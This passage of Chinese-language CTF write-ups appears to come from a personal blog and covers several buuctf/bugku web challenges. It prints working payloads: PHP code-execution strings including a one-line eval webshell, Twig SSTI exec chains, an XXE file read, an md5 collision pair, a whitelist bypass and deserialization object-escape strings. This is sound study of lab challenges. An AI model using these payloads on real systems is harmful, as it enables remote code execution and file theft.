用了一个file_get_contents函数，意思是从文本中获取值，哪来的文本呢？想起来提示说txt文件，那文件名是啥，看了一下提示，说是flag.txt（果然猜就是神），那就直接但是似乎是，ac和fn的值都是要我们传的，这里有两种方法:首先介绍一下：方法一**:使用现成文件**file_get_contents ( string $filename , bool $use_include_path = false , resource $context = ? , int $offset = -1 , int $maxlen = ? ) : string 这个filname是指文件名称：，也就说这边直接输入文件名就可以将文件内容以字符串的形式传入变量，所以我们可以直接构造payload:?ac=bugku&amp;filename=flag.txt 方法二：用php://input构造文件 就行了","link":"/2021/01/30/bugku2/"},{"title":"buuctf6","text":"[BJDCTF2020]The mystery of ip算是一道比较意外的题目吧，发现X-Forwarded-For的内容会被显示，想说会不会是命令注入尝试了一下发现被原样输出了，接下来就没有其他思路了看了一下wp，发现是ssti注入，但是跟以前又不同，这里可以直接使用系统命令,所以是php模板注入！ paylaod: 12{{system('ls')}}{{system('cat /flag')}} [BJDCTF2020]Mark loves catgit泄露，扫一波拿到源码 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude 'flag.php';$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = 'yds'; foreach($_POST as $x =&gt; $y){// $$x = $y;//让x的键名=$y eg:$yds='dog'传入yds=is所以此时 x=yds=dog 变成x=yds=is所以，其实post是没有用的，因为传入的键名只会作为一个值赋给x的键值的键值}foreach($_GET as $x =&gt; $y){// $$x = $$y;//对于get参数: 直接互换，比如说x=yds=dog y=is=cat 那么此时 yds=cat}foreach($_GET as $x =&gt; $y){ if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){//get键名为flag的值和x的值相等 但是x的值也即键名不等flag？真的绕，笑死根本进不去 exit($handsome); }}if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){//get键名为flag的值为空且postflag的值为空，那么就会进来 exit($yds);}//postflag的值等于flag或者getflag的值等于flagif($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is);}echo &quot;the flag is: &quot;.$flag; 审计审计~ $$导致的变量覆盖问题1.$$介绍 $$这种写法称为可变变量 一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。 1234&lt;?php$a=&quot;hello&quot;;$$a='world';//此时$hello=&quot;world&quot;;echo &quot;$a ${$a}&quot;;//相当于$a被解析（被执行为world） 2.漏洞产生 使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。 举例 123456&lt;?phpforeach ($_GET as $key =&gt; $value) {${$key} = $value;}echo $a;?&gt; get得到的数据$key和$value,关键第3行,${$key}用get传进来的$key做为新的变量,将get传进来的$value赋值给它。 get ?a=1 第3行回解析为$a=1。就造成了变量覆盖。 exit()函数：在函数结束脚本的运行时会输出一个信息 在此题中，一开始我以为只要绕过那几个判断，执行到echo的判断就行了，但是其实是不行的，我没有注意到期间$flag的值是否会发生改变，因为这是include’flag.php’的，在index.php修改$flag的值也会覆盖修改flag.php当中的值，那么此时就有两种思路： 1.绕过两个判断但是不改变最终echo里面$flag的值(失败~)2.进入判断，让判断中exit的变量等于flag的值: 这里需要先了解一下代码的执行过程： 可以看到x为键名，y为键值，弄清楚这个，开始正式构造payload，先代码分析一波： 搞清楚这个继续往下 方法一：从exit(yds)入手试试：这里就很简单了，直接用get类型的传入一个yds=flag 方法二：1is=flag&amp;flag=flag [BJDCTF2020]ZJCTF，不过如此1?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php 考察伪协议，使用inpu传入I have a dream绕过第一个判断 进入文件包含，此时过滤flag.php 但是又无法使用data协议看到提示next.php，于是使用filter协议打开: 123456789101112131415161718192021&lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(&quot;\\\\1&quot;)', $str );+}foreach($_GET as $re =&gt; $str) { echo complex($re, $str). &quot;\\n&quot;;}function getFlag(){ @eval($_GET['cmd']);} 到了这里就是只是盲区了，一直在想如何引用getFlag这个函数，但主要是正则表达式没读懂， preg_replace函数之命令执行 preg_replace：(PHP 5.5) 功能 ： 函数执行一个正则表达式的搜索和替换 定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换 $pattern 存在 /e 模式修正符，允许代码执行 /e 模式修正符，使preg_reslace() 将 $replacement 当做php代码来执行 漏洞解析：这道题目考察的是 preg_replace 函数使用 /e 模式，导致代码执行的问题。我们发现在上图代码 第11行 处，将 GET 请求方式传来的参数用在了 complexStrtolower 函数中，而变量 $regex 和 $value 又用在了存在代码执行模式的 preg_replace 函数中。所以，我们可以通过控制 preg_replace 函数第1个、第3个参数，来执行代码。但是可被当做代码执行的第2个参数，却固定为 ‘strtolower(“\\\\1”)’ 。 12345反向引用对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。可变变量：下面再说说我们为什么要匹配到 {${phpinfo()}} 或者 ${phpinfo()} ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)。 这边比较难理解的应该是这个反向引用，所以我用了代码调试一下： 123这里先阐述一下我的理解，\\1可以储存表达式，pattern匹配到的subject的内容将会被存储在strtolower中执行，所以此时我们需要做的就是看什么样的函数构造形式可以在strtolower(&quot;&quot;)中执行，所以此时引入可变变量的知识，上一关的可变变量中，我们理解了$$a实际上是先解析执行了$a这里我们引入${phpinfo()}也是这种用处，我们传入这个值接下来就变成$str=${phpinfo()}也就是$${phpinfo()}，此时{phpinfo()}就会被执行返回1，变成$1,而且需要注意的是由于这里是双引号才可以这样解析，总结起来就是：\\1缓存了我们输入的表达——&gt;该参数可以代码执行——&gt;双引号内变量解析——&gt;引发代码执行变量名ps：这里我在本地运行的时候其实{${}}或者${}都是可以的 123456var_dump(phpinfo()); // 布尔truevar_dump(strtolower(phpinfo()));// 字符串'1',phpinfo执行成功返回1，将1小写var_dump(preg_replace('/(.*)/ie','1','{${phpinfo()}}'));//字符串'11'var_dump(preg_replace('/(.*)/ie','strtolower(&quot;\\\\1&quot;)','{${phpinfo()}}'));// 结果：空字符串''var_dump(preg_replace('/(.*)/ie','strtolower(&quot;{${phpinfo()}}&quot;)','{${phpinfo()}}'));// 结果：空字符串''这里的'strtolower(&quot;{${phpinfo()}}&quot;)'执行后相当于 strtolower(&quot;{${1}}&quot;) 又相当于 strtolower(&quot;{null}&quot;) 又相当于 '' 空字符串 接下来还有一个难点，就是正则匹配式中匹配语句该如何书写呢？： . 匹配除换行符以外的任意字符 \\s 匹配任意的空白符 \\S 匹配任何非空白字符 + 匹配前面的子表达式一次或多次 但是这里无法使用. 因为php的解析特性，会被转义成_就改变来原来我们想要的效果，所以这里需要的是\\S*由于这里是eval函数执行，所以我们可以直接构造一句话木马： payload: 1?\\S*={${eval($_POST['1'])}","link":"/2021/04/01/buuctf6/"},{"title":"buuctf7","text":"[安洵杯 2019]easy_web看到img的后面像base64，解密两次后再经过hex解密，得到一个文件名称，于是尝试读取index.php源码，hex-&gt;base64-&gt;base64 抓包在cmd上做手脚，发现传入数组类型的时候，有回显array，这个时候总觉得有点函数嵌套那味了 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) { echo '&lt;img src =&quot;./ctf3.jpeg&quot;&gt;'; die(&quot;xixiï½ no flag&quot;);} else { $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src='data:image/gif;base64,&quot; . $txt . &quot;'&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;}echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) { echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;} else { if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (&quot;md5 is funny ~&quot;); }}?&gt;&lt;html&gt;&lt;style&gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 又是md5的事情，直接进了 md5碰撞： 1a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;= 在linux系统中: 123cat /flagca\\t /fla\\g 是等价的为什么等价呢？在linux系统中这个反斜线可以使命令换行，和我们之前的题目是一个意思啦。。。 [网鼎杯 2020 朱雀组]phpweb页面一直在刷新，路径也知道了，先抓个包看看,发现可以提交表单，然后用了call_user_func这个危险函数：call_user_func — 把第一个参数作为回调函数调用使用file_get_contents查看index.php源码 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; 果然在一条路上卡太久应该积极转化思路，当我苦苦搜素手册无果的时候，最终选择打开了wp，原来可以利用反序列化来解题： 12345678910111213141516171819&lt;?phpfunction gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;}}class Test { var $p = &quot;cat $(find / -name flag*)&quot;; var $func = &quot;system&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}$a=new Test();print(serialize($a)); 这里有一点需要说明的是，eval不是函数所以这里的call_user_func就不适用了，所以选择system来构造payload，不过这个拿到flag的语句也是让我眼前一亮 [De1CTF 2019]SSRF Me123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: #python这里应该指的就是使用的函数吧，按照这个逻辑下去，首先是action、然后是param。。。。 def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox)#在上面对赋值完成的内容传入Exec中进行执行 def Exec(self): result = {} result['code'] = 500 #使用checkSign()，进行跟踪看看 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r')#真的读取点在这！ result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result#来到这里，使用getSign()函数，看看是否和self.sign=sign相等 def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.#万物的起点在这里！！！！！！@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; #这里进行和秘钥的拼接后md5的加密传回值 return getSign(action, param)#万物的起点还有这里！！！！！！@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) #这里是从cookie传回sign sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr #有个waf if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())#这里！！！！！！，以下就是我们的初始页面了@app.route('/')def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()#这里来个分割线def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50]#感觉这里可以读文件来着 except: return &quot;Connection Timeout&quot;#对传入的内容也就是secert_key+param+action进行加密def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()#来到md5进行加密，并返回值def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) python代码审计:在python2.7中跑，想说用debug了解一下整个代码的运行逻辑，但是跳来跳去的，实在看不明白，可能是由于都是由def的函数形式，所以打算去看看如何审计此类代码:大概进程就是如上所示，接下来要考虑的就是漏洞在哪里，思路都写在上面了，现在传值看看：没有反应，密钥都没有我传个鬼–，学习了路由的知识后，发现其实不止index.php一个入口还有geneSign 还有De1ta入口，这里 根据提示，传入flag.txt查看到密钥 11ae9809211e47b0157b8ea5a0f0b8f55 (这里不是很懂为啥能查看到密钥？也没有相关代码呀，是我看得不够仔细吗)，被wp给误导了，其实也不算误导，应该是我理解错了这里重新理一下思路:其实这里主要绕过的就是一个checksign函数和一个waf函数check函数需要比对的内容是将param和action以及密钥进行拼接，再与我们传入的sign进行比对，但是问题在于，我们没有密钥，所以解题的关键就在这里，我们知道flag在flag.txt文件中，而在genesign中 如果我们传入flag.txt那么返回的内容即为secret_key+flag.txtscan的md5加密，但是后面的action只能是scan会不会有影响呢？其实不会的，因为这也是我们所需要的，进入到exec函数中，其实有两个判断，一个是read一个是scan，当我们在scan前加上read，那么判断就会进入read当中，即可使用read()函数打开flag.txt了救命，终于有不一样的回显了！ 最终payload","link":"/2021/04/08/buuctf7/"},{"title":"buuctf8","text":"[NCTF2019]Fake XML cookbook学习完xml的语法以后，再去看一下xml实体注入的例子，感觉就理解的比较快了 其实就是在外部声明DTD实体，然后直接引用 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY chybeta &quot;Hello World!&quot;&gt; &lt;!--引用对象为chybeta--&gt;]&gt; 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY t SYSTEM &quot;file:///flag&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;t;&lt;/username&gt;&lt;!--&lt;/username&gt;&lt;password&gt;ad&lt;/password&gt;&lt;/user&gt;--&gt;&lt;/user&gt; 直接读取flag 这里贴一下格式: 1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 针对xml注入可以学习:https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/ [ASIS 2019]Unicorn shop这题考的不是很明白，大致就是买独角兽，查看源码，在utf-8旁边有提示，说这个编码问题很重要然后买前三只的回显和最后一只不同，最后一只用一个字符买说钱不够，用多个字符 说只能使用一个字符，于是看看有没有一个字符表示的数字很大的:https://www.compart.com/en/unicode/U+137C 这个网址可以查询：最后将0x换成%就行。 [BJDCTF2020]Cookie is so stable像模板注入，于是尝试输入 1{{1*3}}//回显为3 但是输入 1{{..}} 不论输入什么字符都直接被过滤，看一下是什么模板再对症下药吧：验证 1{{1*'3'}} 发现是twig模板注入，其攻击语句又和淳朴的flask框架不同，构造方式: 123{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}} 1{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /flag&quot;)}} [CISCN 2019 初赛]Love MathPHP函数： scandir() 函数：返回指定目录中的文件和目录的数组。base_convert() 函数：在任意进制之间转换数字。dechex() 函数：把十进制转换为十六进制。hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符(此时就可以执行命令！)。var_dump() ：函数用于输出变量的相关信息。readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。语法：readfile(filename,include_path,context) 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(&quot;太长了不会算&quot;); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(&quot;请不要输入奇奇怪怪的字符&quot;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;请不要输入奇奇怪怪的函数&quot;); } } //帮你算出答案 eval('echo '.$content.';');} 理一下思路:首先他说字符长度不能超过80，其次只能使用白名单内的函数，所以这题的解题方向首先应该是需要使用$_GET之类的函数进行传参，并且要对这些函数做进制转化。一步一步来吧,首先是 1c=system('cat /flag') 对于函数，可以利用动态函数的性质，即字符串做函数名，加上括号即可被当作函数执行： 1c=($_GET[a])($_GET[b]) 故此时我们构造的payload为： 1c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag 从过滤内容中可以发现过滤了中括号，以及get函数还有变量该怎么绕过呢？1.变量绕过，我们可以使用白名单里面的变量，就pi，那么$_GET该如何构造呢？这里就需要可变变量以及上面刚说过的字符串作为函数名执行绕过,解析一下一下payload：base_convert(37907361743,10,36)可以将十进制数转为36进制，36进制就有A-Z的完整字符，接下来使用dechex(1598506324)将该十进制数转为十六进制数的$_GET，两边都转为后拼接起来即为:hex2bin(“5f474554”)就为_GET然后和后面的$（可变变量引入）即可拼接处我们需要的内容 1$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&amp;pi=system&amp;cos=cat /flagxxxxxxxxxx c=$pi=base_convert($pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&amp;pi=system&amp;cos=cat /flag) [BSidesCF 2020]Had a bad dayfilter伪协议可读取 [SUCTF 2019]Pythonginx123456789101112131415161718192021 @app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == 'suctf.cc': return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; 看了一下 原来他是这个意思，前两次的比对中不能等于suctf.cc，最后那次的比对中需要含有suctf.cc才可以进入urlopen，进行文件读取命令这里就有个编码的漏洞:https://bugs.python.org/issue36216感觉还是实际去演示一遍并输出结果才能明了 12345678910111213141516171819202122232425262728293031323334353637383940from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode(): for x in range(65536): uni=chr(x) print(&quot;this is the oorgin&quot;,uni) url=&quot;http://suctf.c{}&quot;.format(uni) print(&quot;this is the orgin&quot;,url) try: if getUrl(url): print(&quot;str: &quot;+uni+' unicode: \\\\u'+str(hex(x))[2:]) except: passdef getUrl(url): url = url host = parse.urlparse(url).hostname print(&quot;this is first:&quot;,host) if host == 'suctf.cc': return False parts = list(urlsplit(url)) print(&quot;this is second:&quot;,parts) host = parts[1] if host == 'suctf.cc': return False newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) print(&quot;this is third:&quot;,parts) finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return True else: return Falseif __name__==&quot;__main__&quot;: get_unicode() 根据大神的脚本进行学习吧，这里用得是python3，导入了两个库这边学习一下几个函数:https://my.oschina.net/u/2474096/blog/1593377这里是相关函数的作用，但是这里重点关注的是他们的解码结果这里只取一组数据来观察: 1234this is first: suctf.cｃthis is second: ['http', 'suctf.cｃ', '', '', '']this is third: ['http', 'suctf.cc', '', '', '']str: ｃ unicode: \\uff43 可以发现当解码形式为urlparse以及urlsplit的时候，不会转化原本的字符，但是当被idna编码再经由utf-8解码后，原本的这里成为怪异字符被转化为正常的字符c此时绕过成功 在python跑出来的C字符中选择一个进去拼接就行，我在burp里面跑，但可能没有编译这个字符所以没跑出来，回到url中就可以了，这里说一下为啥知道用file://协议，因为题目说就在suctf.cc中，那大概率就是以这个为根目录，类似于127.0.0.1，所以此时可以用file://协议直接访问（http协议中的知识点）接下来寻找flag的位置，这题源码中给到提示: 1&lt;!-- Do you know the nginx? --&gt; 那应该是在Nginx的配置目录吗？让我们康康 12?url=file://suctf.cⓒ/usr/local/nginx/conf/nginx.conf?url=file://suctf.cⓒ/usr/fffffflag","link":"/2021/04/11/buuctf8/"},{"title":"buuctf9","text":"[安洵杯 2019]easy_serialize_php反序列化题目: 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php$function = @$_GET['f'];function filter($img)//定义过滤内容{ $filter_arr = array('php', 'flag', 'php5', 'php4');//居然是过滤后缀？ $filter = '/' . implode('|', $filter_arr) . '/i'; return preg_replace($filter, '', $img);}if ($_SESSION) { unset($_SESSION);}$_SESSION[&quot;user&quot;] = 'guest';//这边可能要改一下user$_SESSION['function'] = $function;extract($_POST);if (!$function) { echo '&lt;a href=&quot;buuease_serialize.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';}if (!$_GET['img_path']) {//get一个img_path $_SESSION['img'] = base64_encode('guest_img.png');} else { $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));}$serialize_info = filter(serialize($_SESSION));//对session进行序列化然后过滤内容。if ($function == 'highlight_file') { highlight_file('buuease_serialize.php');} else if ($function == 'phpinfo') { eval('phpinfo();'); //maybe you can find something in here!感觉这里只是告诉我们flag在哪个文件夹里面，其构造攻击手法还是得我们自己来} else if ($function == 'show_image') { $userinfo = unserialize($serialize_info);//进行反序列化。 echo file_get_contents(base64_decode($userinfo['img']));//目标就是进入这里} extract():e函数从数组中将变量导入到当前的符号表。 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 该函数返回成功设置的变量数目。 1234567&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;;?&gt;//$a = Cat; $b = Dog; $c = Horse 大致清楚代码逻辑后，我们先看看phpinfo里面提供了啥信息: flag所在文件名~大概是要读取文件源码 前两天在学序列化的知识的时候有看到一个phar的似乎跟文件有关，然后这里也是允许？会不会有点搞头？继续往下看看 好的没有搞头，因为:根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。 注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。本地测试抓包传一下值吧 需要解决的问题如下:1.对于传入的img_path会进行加密处理，那么传入到unserialize内容中以后就无法被反序列化了2.这里还有一个extract()函数，但是他会被filter过滤内容，所以这里要想想如何绕过，让反序列化执行我们的文件读取类。好的想不出来，看wp发现 PHP反序列化的对象逃逸这题和我在隔壁文档演示的又有点不太一样，这里我们获得文本的点在于 ：base64_decode($userinfo[‘img’])所以此时我们需要含有flag的字符串编码被序列化内容舍弃掉，如何舍弃呢？就是让前面的内容被过滤，那么序列化的字符串就会往下读取字符这里有个误区：后面读取文件的而是序列化内的img值，所以我们需要丢掉的是本来有的img值！也就是说我们传入的值要在程序本来自带的img的前面 flag文件base64加密后为: 1ZDBnM19mMWFnLnBocA== 救命 遇到大坑了，我们利用的是flag等字符会被转化为空来吃掉后面的字符，但是如果我们传入的数据时： 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[img]=Z3Vlc3RfaW1nLnBuZw==&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;img&quot;;s:4:&quot;aaaa&quot;;} 这样子的话吃掉就是img，虽然多构造几个flag也能把function的48字符给吃掉，但是就无法传入img值也就是打开我们的flag://a:3:{s:4:”user”;s:24:””;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;s:8:”function”;s:46:”a”;s:3:”img”;s:4:”aaaa”;s:3:”img”;s:4:”aaaa”;}”;} 像这个有46的出现就报错了~所以要吃掉它呀！！！！！！就要和img互换位置，所以真正的payload为: 12_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;} 12a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}//这里说明一下 最后还要构造一个s:2:&quot;dd&quot;;s:1:&quot;a&quot;;这个对象，因为这样才能把Z3Vlc3RfaW1nLnBuZw==这个图片给挤出去，不干扰我们的结果 调试代码: 